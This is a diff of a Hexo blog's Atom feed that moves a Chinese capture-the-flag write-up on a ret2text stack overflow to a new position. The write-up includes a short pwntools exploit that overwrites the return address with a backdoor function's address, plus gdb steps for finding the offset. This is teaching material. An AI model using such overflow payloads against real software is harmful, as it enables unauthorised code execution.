@@ -6,7 +6,7 @@
   <link href="https://jiutian521.github.io/atom.xml" rel="self"/>
   
   <link href="https://jiutian521.github.io/"/>
-  <updated>2025-11-05T13:40:51.538Z</updated>
+  <updated>2025-11-05T14:04:06.308Z</updated>
   <id>https://jiutian521.github.io/</id>
   
   <author>
@@ -15,28 +15,6 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>用gdb的动态视角看ret2text的实现</title>
-    <link href="https://jiutian521.github.io/posts/2ee84d32.html"/>
-    <id>https://jiutian521.github.io/posts/2ee84d32.html</id>
-    <published>2025-11-05T13:21:00.000Z</published>
-    <updated>2025-11-05T13:40:51.538Z</updated>
-    
-    <content type="html"><![CDATA[<p>来看一道非常简单的栈溢出</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b4fae7ce4b.png" alt="Snipaste_2025-11-05_21-22-13.png"></p><p>后门函数地址ida里很明显，0x8048521</p><p>exp本身不难写,下面看一下怎么用gdb确定偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=process(&quot;./pwn&quot;)</span><br><span class="line">#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);</span><br><span class="line">gdb.attach(io,&quot;b main&quot;) #在main函数下断点</span><br><span class="line">payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b52df75180.png" alt="Snipaste_2025-11-05_21-36-52.png"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b533859667.png" alt="Snipaste_2025-11-05_21-37-43.png"></p><p>0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）</p><p>用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量</p><p>我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b53386ffa9.png" alt="Snipaste_2025-11-05_21-37-58.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;来看一道非常简单的栈溢出&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://youke1.picui.cn/s1/2025/11/05/690b4fae7ce4b.png&quot; alt=&quot;Snipaste_2025-11-05_21-22-13.png&quot;&gt;&lt;/p&gt;
-&lt;p&gt;后门函</summary>
-      
-    
-    
-    
-    
-  </entry>
   
   <entry>
     <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
@@ -117,6 +95,28 @@
       
     <summary type="html">&lt;p&gt;如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。&lt;/p&gt;
 &lt;p&gt;何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&amp;#x2F;</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>用gdb的动态视角看ret2text的实现</title>
+    <link href="https://jiutian521.github.io/posts/2ee84d32.html"/>
+    <id>https://jiutian521.github.io/posts/2ee84d32.html</id>
+    <published>2025-10-27T10:18:00.000Z</published>
+    <updated>2025-11-05T14:08:34.885Z</updated>
+    
+    <content type="html"><![CDATA[<p>来看一道非常简单的栈溢出</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b4fae7ce4b.png" alt="Snipaste_2025-11-05_21-22-13.png"></p><p>后门函数地址ida里很明显，0x8048521</p><p>exp本身不难写,下面看一下怎么用gdb确定偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=process(&quot;./pwn&quot;)</span><br><span class="line">#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);</span><br><span class="line">gdb.attach(io,&quot;b main&quot;) #在main函数下断点</span><br><span class="line">payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b52df75180.png" alt="Snipaste_2025-11-05_21-36-52.png"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b533859667.png" alt="Snipaste_2025-11-05_21-37-43.png"></p><p>0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）</p><p>用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量</p><p>我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b53386ffa9.png" alt="Snipaste_2025-11-05_21-37-58.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;来看一道非常简单的栈溢出&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://youke1.picui.cn/s1/2025/11/05/690b4fae7ce4b.png&quot; alt=&quot;Snipaste_2025-11-05_21-22-13.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;后门函</summary>
       
     
     
